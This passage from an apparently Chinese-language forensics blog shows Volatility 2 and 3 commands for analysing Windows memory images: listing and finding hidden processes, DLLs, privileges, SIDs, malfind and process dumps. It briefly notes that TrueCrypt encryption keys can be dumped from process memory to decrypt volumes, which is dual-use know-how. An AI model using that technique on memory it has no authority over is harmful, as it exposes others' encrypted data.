&lt;li&gt;&lt;strong&gt;Offset(V)&lt;/strong&gt;：进程对象在内存中的虚拟地址&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Name&lt;/strong&gt;：进程的映像文件名（通常是&lt;code&gt;.exe&lt;/code&gt;文件名）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;PID&lt;/strong&gt;：进程ID，每个进程唯一的身份编号&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;PPID&lt;/strong&gt;：父进程ID，即启动这个进程的那个进程的ID&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Thds&lt;/strong&gt;：线程数，该进程拥有的线程数量&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Hnds&lt;/strong&gt;：句柄数，该进程打开的句柄数量&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Sess&lt;/strong&gt;：会话ID，用于区分不同的用户登录会话&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Wow64&lt;/strong&gt;：如果为 &lt;code&gt;True&lt;/code&gt;，表示一个32位进程运行在64位系统上&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Start&lt;/strong&gt;：进程的创建时间&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Exit&lt;/strong&gt;：进程的退出时间（如果进程已终止）&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;volatility3-8&#34;&gt;Volatility3
&lt;/h4&gt;&lt;p&gt;仅查看显式进程：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.pslist.PsList	
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查看包括隐藏进程在内的进程：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.psscan.PsScan	
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250713113512320.png&#34; alt=&#34;image-20250713113512320&#34; style=&#34;zoom：80%;&#34; /&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;PID&lt;/strong&gt;：进程ID&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;PPID&lt;/strong&gt;：父进程ID，即启动这个进程的那个进程的ID&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;ImageFileName&lt;/strong&gt;：进程的映像文件名，通常是&lt;code&gt;.exe&lt;/code&gt;文件名&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Offset(V)&lt;/strong&gt;：进程对象在内存中的虚拟地址&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Threads&lt;/strong&gt;：线程数，该进程拥有的线程数量&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Handles&lt;/strong&gt;：句柄数，该进程打开的句柄数量&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;SessionID&lt;/strong&gt;：会话ID&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Wow64&lt;/strong&gt;：如果为 &lt;code&gt;True&lt;/code&gt;，表示一个32位进程运行在64位系统上&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;CreatTime&lt;/strong&gt;：进程的创建时间&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;ExitTime&lt;/strong&gt;：如果进程已终止，显示进程的退出时间&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;File output：是否已经被导出（dump）&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;查看进程父子关系pstree&#34;&gt;查看进程父子关系（pstree）
&lt;/h3&gt;&lt;h4 id=&#34;volatility2-9&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; pstree
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250706184310572.png&#34; alt=&#34;image-20250706184310572&#34; style=&#34;zoom:50%;&#34; /&gt;
&lt;p&gt;&lt;strong&gt;区分父子进程&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;wininit.exe&lt;/strong&gt;：行首没有点，它是这个分支的顶级进程&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;services.exe&lt;/strong&gt;：行首有 &lt;strong&gt;1个点&lt;/strong&gt;，它位于 &lt;code&gt;wininit.exe&lt;/code&gt;（0个点）的下方，所以 &lt;code&gt;services.exe&lt;/code&gt; 是 &lt;code&gt;wininit.exe&lt;/code&gt; 的子进程&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TCPSVCS.EXE&lt;/strong&gt;：行首有 &lt;strong&gt;2个点&lt;/strong&gt;，它位于 &lt;code&gt;services.exe&lt;/code&gt;（1个点）的下方，所以 &lt;code&gt;TCPSVCS.EXE&lt;/code&gt; 是 &lt;code&gt;services.exe&lt;/code&gt; 的子进程&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;当一个进程的父进程ID（PPID）比它自身的进程ID（PID）还要大时，很可能有问题&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;volatility3-9&#34;&gt;Volatility3
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 vol.py -f &amp;lt;内存镜像&amp;gt; windows.pstree.PsTree
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250713122632330&#34; href=&#34;http://picture.928330.xyz/typora/image-20250713122632330.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250713122632330.png&#34; alt=&#34;image-20250713122632330&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;与volatility2不同，3使用&lt;code&gt;*&lt;/code&gt;来区分父子进程，&lt;code&gt;*&lt;/code&gt;越多，代表进程的层级越深，是更深层的子进程&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Path&lt;/strong&gt;：每个进程可执行文件在硬盘上的完整路径&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Cmd&lt;/strong&gt;：启动该进程时使用的完整命令行参数&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;发现隐藏进程psxview&#34;&gt;发现隐藏进程（psxview）
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;恶意进程一般会隐藏自身，而人工对比pslist和psscan又太麻烦太不可靠&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;可以使用psxview对比各个扫描方式，寻找隐藏进程&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;volatility2-10&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; psxview
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250706223744048.png&#34; alt=&#34;image-20250706223744048&#34; style=&#34;zoom:50%;&#34; /&gt;
&lt;p&gt;&lt;strong&gt;过滤带有false的项目，可以很快看出哪些进程隐藏了自身（主要看第一个pslist和第二个psscan）：&lt;/strong&gt;&lt;/p&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250706223629735.png&#34; alt=&#34;image-20250706223629735&#34; style=&#34;zoom:50%;&#34; /&gt;
&lt;h4 id=&#34;volatility3-10&#34;&gt;Volatility3
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 vol.py -f &amp;lt;内存镜像&amp;gt; windows.malware.psxview.PsXView
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250713130244162&#34; href=&#34;http://picture.928330.xyz/typora/image-20250713130244162.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250713130244162.png&#34; alt=&#34;image-20250713130244162&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;过滤False项：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250713131252462&#34; href=&#34;http://picture.928330.xyz/typora/image-20250713131252462.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250713131252462.png&#34; alt=&#34;image-20250713131252462&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;h3 id=&#34;查看进程启动参数cmdline&#34;&gt;查看进程启动参数（cmdline）
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;能看到进程如何被创建的，包括命令行启动和exe文件点击启动&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;但看不到进程内部的交互，不知道进程干了什么&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;volatility2-11&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; cmdline
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250704132409379.png&#34; alt=&#34;image-20250704132409379&#34; style=&#34;zoom:50%;&#34; /&gt;
&lt;h4 id=&#34;volatility3-11&#34;&gt;Volatility3
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.cmdline.CmdLine
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250713205930999.png&#34; alt=&#34;image-20250713205930999&#34; style=&#34;zoom：67%;&#34; /&gt;
&lt;h3 id=&#34;查看进程加载的dlldlllist&#34;&gt;查看进程加载的DLL（dlllist）
&lt;/h3&gt;&lt;h4 id=&#34;volatility2-12&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; dlllist -p 进程pid
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250713210521338&#34; href=&#34;http://picture.928330.xyz/typora/image-20250713210521338.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250713210521338.png&#34; alt=&#34;image-20250713210521338&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;h4 id=&#34;volatility3-12&#34;&gt;Volatility3
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.dlllist.DllList --pid 进程pid
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;相较于vol2，vol3还给出了dll的加载时间&lt;code&gt;LoadTime&lt;/code&gt;：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250713210420002&#34; href=&#34;http://picture.928330.xyz/typora/image-20250713210420002.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250713210420002.png&#34; alt=&#34;image-20250713210420002&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;h3 id=&#34;查看进程权限privs&#34;&gt;查看进程权限（privs）
&lt;/h3&gt;&lt;h4 id=&#34;volatility2-13&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; privs
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250714095647063&#34; href=&#34;http://picture.928330.xyz/typora/image-20250714095647063.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250714095647063.png&#34; alt=&#34;image-20250714095647063&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;h4 id=&#34;volatility3-13&#34;&gt;Volatility3
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.privileges.Privs
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250714094913789&#34; href=&#34;http://picture.928330.xyz/typora/image-20250714094913789.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250714094913789.png&#34; alt=&#34;image-20250714094913789&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;h3 id=&#34;查看进程对应用户sidgetsids&#34;&gt;查看进程对应用户SID（getsids）
&lt;/h3&gt;&lt;h4 id=&#34;volatility2-14&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; getsids
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250716110818864&#34; href=&#34;http://picture.928330.xyz/typora/image-20250716110818864.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250716110818864.png&#34; alt=&#34;image-20250716110818864&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;h4 id=&#34;volatility3-14&#34;&gt;Volatility3
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.getsids.GetSIDs 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250716110351479&#34; href=&#34;http://picture.928330.xyz/typora/image-20250716110351479.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250716110351479.png&#34; alt=&#34;image-20250716110351479&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;相较于Volatility2，这个输出更加规范化：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;PID&lt;/strong&gt;：进程ID&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Process&lt;/strong&gt;：进程名&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;SID&lt;/code&gt;&lt;/strong&gt;：安全标识符的字符串表示&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Name&lt;/strong&gt;：该 SID 对应的通用名称&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;一个进程会对应多个SID，是因为一个进程的访问令牌中，不仅包含了其主要运行身份的SID，还包含了该身份所属的所有用户组的SID，这些SID共同决定了该进程的权限&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;例如，System(PID:4)这个进程，它关联了多个SID：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;S-1-5-18 (Local System)&lt;/strong&gt;：这是它的主身份，代表了系统的最高权限&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;S-1-5-32-544 (Administrators)&lt;/strong&gt;：表明它也属于管理员组&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;S-1-1-0 (Everyone)&lt;/strong&gt;：表明它也属于Everyone组&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;查看可能的恶意代码malfind&#34;&gt;查看可能的恶意代码（malfind）
&lt;/h3&gt;&lt;h4 id=&#34;volatility2-15&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; malfind
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250714104850074&#34; href=&#34;http://picture.928330.xyz/typora/image-20250714104850074.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250714104850074.png&#34; alt=&#34;image-20250714104850074&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;volatility2还有一个社区插件，是malfind的深度扫描版本malfinddeep：&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/superponible/volatility-plugins&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/superponible/volatility-plugins
    
    &lt;span style=&#34;white-space: nowrap;&#34;&gt;&lt;svg width=&#34;.7em&#34;
        height=&#34;.7em&#34; viewBox=&#34;0 0 21 21&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
        &lt;path d=&#34;m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z&#34; fill=&#34;currentColor&#34; /&gt;
        &lt;path d=&#34;M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z&#34;
            fill=&#34;currentColor&#34;&gt;
    &lt;/svg&gt;&lt;/span&gt;
    
&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; malfinddeep
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;volatility3-15&#34;&gt;Volatility3
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f MemoryDump_Lab5.raw windows.malware.malfind.Malfind
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250714104152510&#34; href=&#34;http://picture.928330.xyz/typora/image-20250714104152510.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250714104152510.png&#34; alt=&#34;image-20250714104152510&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;h3 id=&#34;提取进程内存memdumpdump&#34;&gt;提取进程内存（memdump/&amp;ndash;dump）
&lt;/h3&gt;&lt;p&gt;进程内存中潜藏着很多信息，把他们提取出来才能更好的做分析&lt;/p&gt;
&lt;p&gt;比如TrueCrypt进程中会有加密密钥，导出其为.dmp文件后，可以交给EFDD解密加密卷&lt;/p&gt;
&lt;h4 id=&#34;volatility2-16&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; memdump -p &amp;lt;PID&amp;gt; -D &amp;lt;保存路径&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;提取后的文件为.dump，存储了进程所有的数据，可以在里面搜索目标字符串等&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果进程里有想要的文件，可以使用foremost分离文件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果目标比较明显（比如图片），也可以用mv命令修改文件后缀再打开，再在里面找目标文件&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;volatility3-16&#34;&gt;Volatility3
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;vol3不再有单独的dump插件，直接在&lt;code&gt;PsList&lt;/code&gt;插件使用&lt;code&gt;--dump&lt;/code&gt;选项：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3  -f &amp;lt;内存镜像&amp;gt; -o &amp;lt;保存路径&amp;gt; windows.pslist.PsList --pid &amp;lt;PID&amp;gt; --dump
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;这里的&lt;code&gt;-o&lt;/code&gt;选项用于指定导出文件的路径，必须放在&lt;code&gt;-f&lt;/code&gt;选项后一个！！&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;网络活动分析&#34;&gt;网络活动分析
&lt;/h2&gt;&lt;h3 id=&#34;查看网络连接netscannetstat&#34;&gt;查看网络连接（netscan/netstat）
&lt;/h3&gt;&lt;h4 id=&#34;volatility2-17&#34;&gt;Volatility2
&lt;/h4&gt;&lt;p&gt;查看当前以及历史、隐藏网络链接（这个是XP时代的工具了，很老，不一定有用）：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; connscan
